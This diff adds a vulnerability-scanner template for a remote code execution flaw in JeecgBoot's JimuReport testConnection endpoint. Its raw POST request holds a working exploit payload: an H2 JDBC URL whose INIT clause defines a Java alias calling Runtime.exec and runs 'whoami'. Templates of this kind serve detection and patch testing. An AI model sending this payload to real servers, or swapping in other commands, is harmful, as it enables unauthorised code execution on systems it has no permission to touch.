@@ -1,0 +1,36 @@
+id: jeecgboot-jmreport-rce
+info:
+  name: Jeecg Boot JimuReport testConnection Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JeecgBoot's /jmreport/testConnection endpoint is vulnerable to remote code execution due to improper validation of the dbUrl parameter when the H2 database driver is present.
+  reference:
+    - https://github.com/jeecgboot/jeecg-boot
+http:
+  - raw:
+      - |
+        POST /jmreport/testConnection HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+           "id": "1",
+           "code": "ABC",
+           "dbType": "MySQL",
+           "dbDriver": "org.h2.Driver",
+           "dbUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {java.lang.Runtime.getRuntime().exec(b);}';CALL EXEC('whoami')",
+           "dbName": "test",
+           "dbPassword": "test",
+           "userName": "test"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"success\":true"
+        part: body
+      - type: word
+        words:
+          - "org.h2.Driver"
+        part: body
